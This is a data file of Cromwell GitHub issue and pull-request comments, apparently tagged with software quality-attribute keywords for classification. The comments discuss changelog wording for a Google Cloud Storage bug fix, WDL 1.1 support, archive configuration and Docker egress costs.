https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800620139:19,Testability,log,logging,19,"> The messages are logging the size of the list being (re-)added to the BatchRequest, not what's inside the possibly stale ArrayList inside the BatchRequest object. Yeah okay maybe don't mention that then since it will force those future maintainers to imagine what was happening before this variable became a local...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800620139
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991:129,Availability,error,errors,129,"No worries, that's what PRs are for. 😉 . Regarding the text:. > Fixed a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large. This PR doesn't address the _initial_ read timeouts. But it does mitigate them piling up to create bigger batches that might cause more timeouts. What I'm not sure of is with this change of a new-batch-per-request will the ""Attempted 10 times"" be able to weather whatever is causing the timeout hiccups or not. I don't want to overpromise in the message, so maybe something like?. > Better handling for a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991:173,Availability,error,errors,173,"No worries, that's what PRs are for. 😉 . Regarding the text:. > Fixed a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large. This PR doesn't address the _initial_ read timeouts. But it does mitigate them piling up to create bigger batches that might cause more timeouts. What I'm not sure of is with this change of a new-batch-per-request will the ""Attempted 10 times"" be able to weather whatever is causing the timeout hiccups or not. I don't want to overpromise in the message, so maybe something like?. > Better handling for a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991:738,Availability,error,errors,738,"No worries, that's what PRs are for. 😉 . Regarding the text:. > Fixed a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large. This PR doesn't address the _initial_ read timeouts. But it does mitigate them piling up to create bigger batches that might cause more timeouts. What I'm not sure of is with this change of a new-batch-per-request will the ""Attempted 10 times"" be able to weather whatever is causing the timeout hiccups or not. I don't want to overpromise in the message, so maybe something like?. > Better handling for a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991:782,Availability,error,errors,782,"No worries, that's what PRs are for. 😉 . Regarding the text:. > Fixed a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large. This PR doesn't address the _initial_ read timeouts. But it does mitigate them piling up to create bigger batches that might cause more timeouts. What I'm not sure of is with this change of a new-batch-per-request will the ""Attempted 10 times"" be able to weather whatever is causing the timeout hiccups or not. I don't want to overpromise in the message, so maybe something like?. > Better handling for a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991:622,Integrability,message,message,622,"No worries, that's what PRs are for. 😉 . Regarding the text:. > Fixed a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large. This PR doesn't address the _initial_ read timeouts. But it does mitigate them piling up to create bigger batches that might cause more timeouts. What I'm not sure of is with this change of a new-batch-per-request will the ""Attempted 10 times"" be able to weather whatever is causing the timeout hiccups or not. I don't want to overpromise in the message, so maybe something like?. > Better handling for a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991:319,Safety,timeout,timeouts,319,"No worries, that's what PRs are for. 😉 . Regarding the text:. > Fixed a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large. This PR doesn't address the _initial_ read timeouts. But it does mitigate them piling up to create bigger batches that might cause more timeouts. What I'm not sure of is with this change of a new-batch-per-request will the ""Attempted 10 times"" be able to weather whatever is causing the timeout hiccups or not. I don't want to overpromise in the message, so maybe something like?. > Better handling for a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991:412,Safety,timeout,timeouts,412,"No worries, that's what PRs are for. 😉 . Regarding the text:. > Fixed a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large. This PR doesn't address the _initial_ read timeouts. But it does mitigate them piling up to create bigger batches that might cause more timeouts. What I'm not sure of is with this change of a new-batch-per-request will the ""Attempted 10 times"" be able to weather whatever is causing the timeout hiccups or not. I don't want to overpromise in the message, so maybe something like?. > Better handling for a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991:563,Safety,timeout,timeout,563,"No worries, that's what PRs are for. 😉 . Regarding the text:. > Fixed a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large. This PR doesn't address the _initial_ read timeouts. But it does mitigate them piling up to create bigger batches that might cause more timeouts. What I'm not sure of is with this change of a new-batch-per-request will the ""Attempted 10 times"" be able to weather whatever is causing the timeout hiccups or not. I don't want to overpromise in the message, so maybe something like?. > Better handling for a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800638600:168,Availability,error,error,168,"Ah yes, let's just claim we fixed one bug then 😄 ; My take; use, modify, or discard as desired:; > Fixed a bug that could cause workflows to fail unexpectedly with the error `413 Request Entity Too Large` when accessing Google Cloud Storage.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800638600
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800638600:210,Security,access,accessing,210,"Ah yes, let's just claim we fixed one bug then 😄 ; My take; use, modify, or discard as desired:; > Fixed a bug that could cause workflows to fail unexpectedly with the error `413 Request Entity Too Large` when accessing Google Cloud Storage.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800638600
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800644653:155,Deployability,patch,patch,155,"Cool. 59 is scheduled to go out before March 26. I'll edit the changelog once I figure out if the lab wants to:; - wait for us to finish fixing our CI and patch 58, or; - take a 59-SNAP and this fix may not be hotfixed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800644653
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800644653:210,Deployability,hotfix,hotfixed,210,"Cool. 59 is scheduled to go out before March 26. I'll edit the changelog once I figure out if the lab wants to:; - wait for us to finish fixing our CI and patch 58, or; - take a 59-SNAP and this fix may not be hotfixed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800644653
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800644653:12,Energy Efficiency,schedul,scheduled,12,"Cool. 59 is scheduled to go out before March 26. I'll edit the changelog once I figure out if the lab wants to:; - wait for us to finish fixing our CI and patch 58, or; - take a 59-SNAP and this fix may not be hotfixed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800644653
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-801441676:33,Availability,avail,available,33,Changelog updated and this PR is available for re-review. The lab deployed a `-SNAP` version. Updated the changelog list this change as part of `59` and filed BT-187 regarding hotfix PRs breaking in Circle CI.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-801441676
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-801441676:10,Deployability,update,updated,10,Changelog updated and this PR is available for re-review. The lab deployed a `-SNAP` version. Updated the changelog list this change as part of `59` and filed BT-187 regarding hotfix PRs breaking in Circle CI.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-801441676
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-801441676:66,Deployability,deploy,deployed,66,Changelog updated and this PR is available for re-review. The lab deployed a `-SNAP` version. Updated the changelog list this change as part of `59` and filed BT-187 regarding hotfix PRs breaking in Circle CI.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-801441676
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-801441676:94,Deployability,Update,Updated,94,Changelog updated and this PR is available for re-review. The lab deployed a `-SNAP` version. Updated the changelog list this change as part of `59` and filed BT-187 regarding hotfix PRs breaking in Circle CI.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-801441676
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-801441676:176,Deployability,hotfix,hotfix,176,Changelog updated and this PR is available for re-review. The lab deployed a `-SNAP` version. Updated the changelog list this change as part of `59` and filed BT-187 regarding hotfix PRs breaking in Circle CI.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-801441676
https://github.com/broadinstitute/cromwell/pull/6219#issuecomment-801443507:13,Deployability,hotfix,hotfix,13,Closing this hotfix PR due to BT-187. Sibling develop PR is here: https://github.com/broadinstitute/cromwell/pull/6218,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6219#issuecomment-801443507
https://github.com/broadinstitute/cromwell/issues/6221#issuecomment-870046753:31,Deployability,update,update,31,@pshapiro4broad ; Is there any update on this or planned inclusion? I am also running into the same issue. It would be nice if Cromwell supported the latest specification(s) of WDL.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6221#issuecomment-870046753
https://github.com/broadinstitute/cromwell/issues/6221#issuecomment-1036412500:4,Deployability,update,update,4,Any update about WDL 1.1 support ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6221#issuecomment-1036412500
https://github.com/broadinstitute/cromwell/issues/6221#issuecomment-1288984564:4,Deployability,update,updates,4,any updates?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6221#issuecomment-1288984564
https://github.com/broadinstitute/cromwell/issues/6221#issuecomment-1499403575:268,Availability,avail,available,268,"This is causing a problem for me trying to write a workflow. I want to use [string interpolation](https://github.com/openwdl/wdl/blob/main/versions/1.1/SPEC.md#expression-placeholders-and-string-interpolation), which is a WDL 1.1 feature. It is not specified as being available in WDL 1.0 outside of commands, but Cromwell happens to support it in all strings in 1.0 (and maybe also draft-2?). If I put a `version 1.1` statement in my workflow, Cromwell won't parse it, because it knows it doesn't support 1.1. But if I put a `version 1.0` statement, my workflow isn't actually compliant with the spec, because 1.0 doesn't say that this feature is available. So I have a workflow that both Cromwell and any 1.1-compliant runner can run, except I can't write a correct version statement for it, or Cromwell will reject it. One solution might be to tell Cromwell that it does support version 1.1, at least partially, instead of rejecting all 1.1 workflows.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6221#issuecomment-1499403575
https://github.com/broadinstitute/cromwell/issues/6221#issuecomment-1499403575:648,Availability,avail,available,648,"This is causing a problem for me trying to write a workflow. I want to use [string interpolation](https://github.com/openwdl/wdl/blob/main/versions/1.1/SPEC.md#expression-placeholders-and-string-interpolation), which is a WDL 1.1 feature. It is not specified as being available in WDL 1.0 outside of commands, but Cromwell happens to support it in all strings in 1.0 (and maybe also draft-2?). If I put a `version 1.1` statement in my workflow, Cromwell won't parse it, because it knows it doesn't support 1.1. But if I put a `version 1.0` statement, my workflow isn't actually compliant with the spec, because 1.0 doesn't say that this feature is available. So I have a workflow that both Cromwell and any 1.1-compliant runner can run, except I can't write a correct version statement for it, or Cromwell will reject it. One solution might be to tell Cromwell that it does support version 1.1, at least partially, instead of rejecting all 1.1 workflows.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6221#issuecomment-1499403575
https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887602522:34,Security,validat,validate,34,@KevinDuringWork Were you able to validate this work before. Is your team utilizing this?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887602522
https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887630369:222,Deployability,configurat,configurations,222,This pull-request may be a little outdated (see conflict). But we're running this at my work. . The solution may need to discussed/documented further as we're essentially introducing another a separate project-id into the configurations.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887630369
https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887630369:222,Modifiability,config,configurations,222,This pull-request may be a little outdated (see conflict). But we're running this at my work. . The solution may need to discussed/documented further as we're essentially introducing another a separate project-id into the configurations.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887630369
https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887634687:137,Deployability,update,updates,137,@KevinDuringWork: would you be willing to work with the team here to look at how we introduce this into the main branch and allow easier updates for you and others?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887634687
https://github.com/broadinstitute/cromwell/pull/6230#issuecomment-807456524:238,Deployability,configurat,configuration,238,"Ready for review, satisfies A/C of:. 1. Process subworkflows separately from their parents (`IncludeSubworkflows.name -> ""true""`); 2. Start at the very oldest workflows (`NewestFirst.name -> ""false""`); 3. Allow for a “not before” time in configuration (`archiveDelay`, `deleteDelay`). ( The last A/C involving the config seems to have already been addressed on `dev` of `firecloud-develop` )",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6230#issuecomment-807456524
https://github.com/broadinstitute/cromwell/pull/6230#issuecomment-807456524:238,Modifiability,config,configuration,238,"Ready for review, satisfies A/C of:. 1. Process subworkflows separately from their parents (`IncludeSubworkflows.name -> ""true""`); 2. Start at the very oldest workflows (`NewestFirst.name -> ""false""`); 3. Allow for a “not before” time in configuration (`archiveDelay`, `deleteDelay`). ( The last A/C involving the config seems to have already been addressed on `dev` of `firecloud-develop` )",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6230#issuecomment-807456524
https://github.com/broadinstitute/cromwell/pull/6230#issuecomment-807456524:314,Modifiability,config,config,314,"Ready for review, satisfies A/C of:. 1. Process subworkflows separately from their parents (`IncludeSubworkflows.name -> ""true""`); 2. Start at the very oldest workflows (`NewestFirst.name -> ""false""`); 3. Allow for a “not before” time in configuration (`archiveDelay`, `deleteDelay`). ( The last A/C involving the config seems to have already been addressed on `dev` of `firecloud-develop` )",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6230#issuecomment-807456524
https://github.com/broadinstitute/cromwell/pull/6230#issuecomment-808437630:72,Testability,test,test-passing,72,"Note: Because this is merging into a side-branch and not `develop`, all test-passing and review requirements are optional here (since the requirements will be enforced on the subsequent PR into `develop`)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6230#issuecomment-808437630
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:171,Availability,error,error,171,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:357,Availability,avail,available,357,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:1843,Availability,avail,available,1843,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:524,Energy Efficiency,charge,charges,524,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:1236,Performance,scalab,scalable,1236,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:1497,Performance,perform,performed,1497,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:687,Safety,detect,detects,687,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702
